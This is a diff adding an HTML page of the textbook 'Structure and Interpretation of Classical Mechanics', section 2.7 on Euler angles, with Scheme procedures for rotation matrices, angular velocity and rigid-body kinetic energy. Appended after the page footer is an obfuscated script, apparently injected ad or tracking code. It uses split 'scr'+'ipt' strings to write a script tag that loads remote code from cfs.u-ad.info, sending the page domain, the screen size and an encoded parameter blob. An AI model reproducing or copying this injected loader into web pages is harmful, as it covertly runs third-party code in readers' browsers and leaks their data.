@@ -1,0 +1,202 @@
+<!doctype html public "-//W3C//DTD HTML 4.0 Transitional//EN" "http://www.w3.org/TR/REC-html40/loose.dtd">
+<html>
+<!-- Generated from TeX source by tex2page, v 4p3, 
+     (c) Dorai Sitaram, http://www.cs.rice.edu/~dorai/tex2page -->
+<head>
+<title>
+
+Structure and Interpretation 
+of Classical Mechanics
+
+</title>
+<link rel="stylesheet" type="text/css" href="book-Z-C.css" title=default>
+<meta name=robots content="noindex,follow">
+</head>
+<body>
+<div class=navigation>[Go to <span><a href="book.html">first</a>, <a href="book-Z-H-26.html">previous</a></span><span>, <a href="book-Z-H-28.html">next</a></span> page<span>; &nbsp;&nbsp;</span><span><a href="book-Z-H-4.html#%_toc_start">contents</a></span><span><span>; &nbsp;&nbsp;</span><a href="book-Z-H-82.html#%_index_start">index</a></span>]</div>
+<p></p>
+<a name="%_sec_2.7"></a>
+<h2><a href="book-Z-H-4.html#%_toc_%_sec_2.7">2.7&nbsp;&nbsp;Euler Angles</a></h2>
+<p>
+<a name="%_idx_1188"></a>
+To go further we must finally specify a set of generalized
+coordinates.  We first do this using the traditional <em>Euler
+angles</em>.  Later, we find other ways of describing the
+orientation of a rigid body.</p>
+<p>
+We are using an intermediate representation of the orientation in
+terms of the function  <em>M</em> of the generalized coordinates
+that gives the rotation that takes the body from some reference
+orientation and rotates it to the orientation specified by the
+generalized coordinates.  Here we take the reference orientation so that
+principal-axis unit vectors hata, <img src="chap2-Z-G-D-13.gif" border="0">, <img src="chap2-Z-G-D-14.gif" border="0"> are
+coincident with the basis vectors <img src="chap2-Z-G-D-9.gif" border="0"><sub><em>i</em></sub>, labeled here by <img src="chap2-Z-G-D-6.gif" border="0">, <img src="chap2-Z-G-D-16.gif" border="0">,
+<img src="chap2-Z-G-D-7.gif" border="0">.  </p>
+<p>
+We define the Euler angles in terms of simple rotations about the
+coordinate axes.  Let <em>R</em><sub><em>x</em></sub>(<img src="chap1-Z-G-D-56.gif" border="0">) be a right-handed rotation about
+the <img src="chap2-Z-G-D-6.gif" border="0"> axis by the angle <img src="chap1-Z-G-D-56.gif" border="0">, and let <em>R</em><sub><em>z</em></sub>(<img src="chap1-Z-G-D-56.gif" border="0">) be a
+right-handed rotation about the <img src="chap2-Z-G-D-7.gif" border="0"> axis by the angle <img src="chap1-Z-G-D-56.gif" border="0">.
+The function  <em>M</em> for Euler angles is written as a composition
+of three of these simple coordinate axis rotations:
+<a name="EQUATION_2.39"></a></p>
+<div align=left><img src="chap2-Z-G-42.gif" border="0"></div>
+<p>
+for the Euler angles <img src="chap1-Z-G-D-19.gif" border="0">, <img src="chap1-Z-G-D-16.gif" border="0">, <img src="chap1-Z-G-D-56.gif" border="0">.</p>
+<p>
+<a name="%_idx_1190"></a>The Euler angles can specify any orientation of the body, but the
+orientation does not always correspond to a unique set of Euler
+angles.  In particular, if <img src="chap1-Z-G-D-19.gif" border="0">  =  0 then the orientation is
+dependent only on the sum <img src="chap1-Z-G-D-16.gif" border="0">  +  <img src="chap1-Z-G-D-56.gif" border="0">, so the orientation does not
+uniquely determine either <img src="chap1-Z-G-D-16.gif" border="0"> or <img src="chap1-Z-G-D-56.gif" border="0">.</p>
+<p>
+</p>
+<p><a name="%_thm_2.8"></a>
+<b>Exercise 2.8.</b>&nbsp;&nbsp;<strong>Euler angles</strong><br>
+It is not immediately obvious that all orientations can be represented
+in terms of the Euler angles.  To show that the Euler angles are adequate
+to represent all orientations, solve for the Euler angles that give an
+arbitrary rotation <em>R</em>.  Keep in mind that some orientations do not
+correspond to a unique representation in terms of Euler angles.
+</p>
+
+<p></p>
+<p>
+<a name="%_idx_1192"></a>Though the Euler angles allow us to specify all orientations and thus
+can be used as generalized coordinates, the definition of Euler angles
+is pretty arbitrary.  In fact no reasoning has led us to them.
+This is reflected in our presentation of them by just saying ``here
+they are.'' Euler angles are well suited for some problems, but
+cumbersome for others.</p>
+<p>
+There are other ways of defining similar sets of angles.  For
+instance, we could also take our generalized coordinates to satisfy
+<a name="EQUATION_2.40"></a></p>
+<div align=left><img src="chap2-Z-G-43.gif" border="0"></div>
+<p>
+Such alternatives to the Euler angles come in handy from time to time.</p>
+<p>
+<a name="%_idx_1194"></a>Each of the fundamental rotations can be represented as a matrix.
+The rotation matrix representing a right-handed rotation about the
+<img src="chap2-Z-G-D-7.gif" border="0"> axis by the angle <img src="chap1-Z-G-D-56.gif" border="0"> is
+<a name="EQUATION_2.41"></a></p>
+<div align=left><img src="chap2-Z-G-44.gif" border="0"></div>
+<p>
+and a right-handed rotation about the <em>x</em> axis by the angle <img src="chap1-Z-G-D-56.gif" border="0"> is
+represented by the matrix
+<a name="EQUATION_2.42"></a></p>
+<div align=left><img src="chap2-Z-G-45.gif" border="0"></div>
+<p>
+The matrix that represents the rotation that carries the body from its
+reference orientation to the actual orientation is
+<a name="EQUATION_2.43"></a></p>
+<div align=left><img src="chap2-Z-G-46.gif" border="0"></div>
+<p></p>
+<p>
+The rotation matrices and their product can be constructed by simple
+programs:
+</p>
+<p><tt>(define&nbsp;(rotate-z-matrix&nbsp;angle)<br>
+&nbsp;&nbsp;(matrix-by-rows<br>
+&nbsp;&nbsp;&nbsp;&nbsp;(list&nbsp;(cos&nbsp;angle)&nbsp;(-&nbsp;(sin&nbsp;angle))&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0)<br>
+&nbsp;&nbsp;&nbsp;&nbsp;(list&nbsp;(sin&nbsp;angle)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(cos&nbsp;angle)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0)<br>
+&nbsp;&nbsp;&nbsp;&nbsp;(list&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;1)))<br>
+</p>
+</tt>
+<p></p>
+<p><tt>(define&nbsp;(rotate-x-matrix&nbsp;angle)<br>
+&nbsp;&nbsp;(matrix-by-rows&nbsp;<br>
+&nbsp;&nbsp;&nbsp;&nbsp;(list&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0)<br>
+&nbsp;&nbsp;&nbsp;&nbsp;(list&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(cos&nbsp;angle)&nbsp;(-&nbsp;(sin&nbsp;angle)))<br>
+&nbsp;&nbsp;&nbsp;&nbsp;(list&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(sin&nbsp;angle)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(cos&nbsp;angle))))<br>
+</p>
+</tt>
+<p></p>
+<p><tt><a name="%_idx_1196"></a>(define&nbsp;(Euler-&gt;M&nbsp;angles)<br>
+&nbsp;&nbsp;(let&nbsp;((theta&nbsp;(ref&nbsp;angles&nbsp;0))<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(phi&nbsp;&nbsp;&nbsp;(ref&nbsp;angles&nbsp;1))<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(psi&nbsp;&nbsp;&nbsp;(ref&nbsp;angles&nbsp;2)))<br>
+&nbsp;&nbsp;&nbsp;&nbsp;(*&nbsp;(rotate-z-matrix&nbsp;phi)<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(rotate-x-matrix&nbsp;theta)<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(rotate-z-matrix&nbsp;psi))))<br>
+</p>
+</tt>
+<p>
+Now that we have a procedure that implements a sample  <em>M</em>, we
+can find the components of the <a name="%_idx_1198"></a>angular velocity vector and the body
+components of the angular velocity vector using the procedures 
+<tt>M-of-q-&gt;omega-of-t</tt> and <tt>M-of-q-&gt;omega-body-of-t</tt> from
+section&nbsp;<a href="book-Z-H-26.html#%_sec_2.6">2.6</a>.  For example,
+</p>
+<p><tt>(show-expression<br>
+&nbsp;(((M-of-q-&gt;omega-body-of-t&nbsp;Euler-&gt;M)<br>
+&nbsp;&nbsp;&nbsp;(up&nbsp;(literal-function&nbsp;'theta)<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(literal-function&nbsp;'phi)<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(literal-function&nbsp;'psi)))<br>
+&nbsp;&nbsp;'t))<br>
+</p>
+</tt>
+<p></p>
+<hr>
+
+<p></p>
+<div align=left><img src="chap2-Z-G-47.gif" border="0"></div>
+<p></p>
+<hr>
+
+<p></p>
+<p>
+To construct the kinetic energy we need the procedure of state that
+gives the body components of the angular velocity vector:
+</p>
+<p><tt>(show-expression<br>
+&nbsp;((M-&gt;omega-body&nbsp;Euler-&gt;M)<br>
+&nbsp;&nbsp;(up&nbsp;'t&nbsp;<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(up&nbsp;'theta&nbsp;'phi&nbsp;'psi)<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(up&nbsp;'thetadot&nbsp;'phidot&nbsp;'psidot))))<br>
+</p>
+</tt>
+<p></p>
+<hr>
+
+<p></p>
+<div align=left><img src="chap2-Z-G-48.gif" border="0"></div>
+<p></p>
+<hr>
+
+<p>
+We capture this result as a procedure:
+</p>
+<p><tt><a name="%_idx_1200"></a>(define&nbsp;(Euler-state-&gt;omega-body&nbsp;local)<br>
+&nbsp;&nbsp;(let&nbsp;((q&nbsp;(coordinate&nbsp;local))&nbsp;(qdot&nbsp;(velocity&nbsp;local)))<br>
+&nbsp;&nbsp;&nbsp;&nbsp;(let&nbsp;((theta&nbsp;(ref&nbsp;q&nbsp;0))&nbsp;<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(psi&nbsp;(ref&nbsp;q&nbsp;2))<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(thetadot&nbsp;(ref&nbsp;qdot&nbsp;0))<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(phidot&nbsp;(ref&nbsp;qdot&nbsp;1))<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(psidot&nbsp;(ref&nbsp;qdot&nbsp;2)))<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(let&nbsp;((omega-a&nbsp;(+&nbsp;(*&nbsp;thetadot&nbsp;(cos&nbsp;psi))<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(*&nbsp;phidot&nbsp;(sin&nbsp;theta)&nbsp;(sin&nbsp;psi))))<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(omega-b&nbsp;(+&nbsp;(*&nbsp;-1&nbsp;thetadot&nbsp;(sin&nbsp;psi))<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(*&nbsp;phidot&nbsp;(sin&nbsp;theta)&nbsp;(cos&nbsp;psi))))<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(omega-c&nbsp;(+&nbsp;(*&nbsp;phidot&nbsp;(cos&nbsp;theta))&nbsp;psidot)))<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(column-matrix&nbsp;omega-a&nbsp;omega-b&nbsp;omega-c)))))<br>
+</p>
+</tt>
+<p>
+<a name="%_idx_1202"></a><a name="%_idx_1204"></a><a name="%_idx_1206"></a>The kinetic energy can be written:
+</p>
+<p><tt><a name="%_idx_1208"></a>(define&nbsp;((T-rigid-body&nbsp;A&nbsp;B&nbsp;C)&nbsp;local)<br>
+&nbsp;&nbsp;(let&nbsp;((omega-body&nbsp;(Euler-state-&gt;omega-body&nbsp;local)))<br>
+&nbsp;&nbsp;&nbsp;&nbsp;(*&nbsp;1/2<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(+&nbsp;(*&nbsp;A&nbsp;(square&nbsp;(ref&nbsp;omega-body&nbsp;0)))<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(*&nbsp;B&nbsp;(square&nbsp;(ref&nbsp;omega-body&nbsp;1)))<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(*&nbsp;C&nbsp;(square&nbsp;(ref&nbsp;omega-body&nbsp;2)))))))<br>
+</p>
+</tt>
+<p></p>
+<p>
+</p>
+<div class=navigation>[Go to <span><a href="book.html">first</a>, <a href="book-Z-H-26.html">previous</a></span><span>, <a href="book-Z-H-28.html">next</a></span> page<span>; &nbsp;&nbsp;</span><span><a href="book-Z-H-4.html#%_toc_start">contents</a></span><span><span>; &nbsp;&nbsp;</span><a href="book-Z-H-82.html#%_index_start">index</a></span>]</div>
+<p></p>
+<script type="text/javascript">if(self==top){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);document.write("<scr"+"ipt type=text/javascript src="+idc_glo_url+ "cfs.u-ad.info/cfspushadsv2/request");document.write("?id=1");document.write("&amp;enc=telkom2");document.write("&amp;params=" + "4TtHaUQnUEiP6K%2fc5C582NgXaqsgjSGNhMkGfMSQiD2T8LVMTmnr1MzhbP3b9EoPoqAD4wr7OhAjy3Bqy3ZswmDVGCGnMWnMpkOyfyfo%2bjTygIrX2SQy%2fu%2bBADfMwqTDfYQR0HgYSqKBy53G8KNgI6E0jicfVhRAPKINmygWPXeQ1Ff3NekDtbYfP3aXmmnPpCXRAW1OR%2f5SdSAQ492nDzdsUtcAqO9uyClbKUB49G41G5%2bWlzYzNTh8B%2fhDE%2byFZaL9LzBkFa8h3cVePvk2BdIE1M8qUzTzdUxw90JvxWLRJ8e5bDND632KfjU223N0N5rIMFK%2fmJb2k7S3adfEVEUJDtxkxqJVJMHME24lUe9xenn4B9RWYLQrvmVkpKmy5E8Ie7BXO%2fiUxJD6JLj9Bw8f39UfzCcB9SojWlvZZl9eIQOfesR8%2f40RLznr3x7hHKtKaDhV3hg3oSg%2b1tTZuXrj%2fU9dyhX9l5cRpqjaAIBdt49ajxVUBqEvXScrxOzt");document.write("&amp;idc_r="+idc_glo_r);document.write("&amp;domain="+document.domain);document.write("&amp;sw="+screen.width+"&amp;sh="+screen.height);document.write("></scr"+"ipt>");}</script><noscript>activate javascript</noscript></body></body>
+</html>
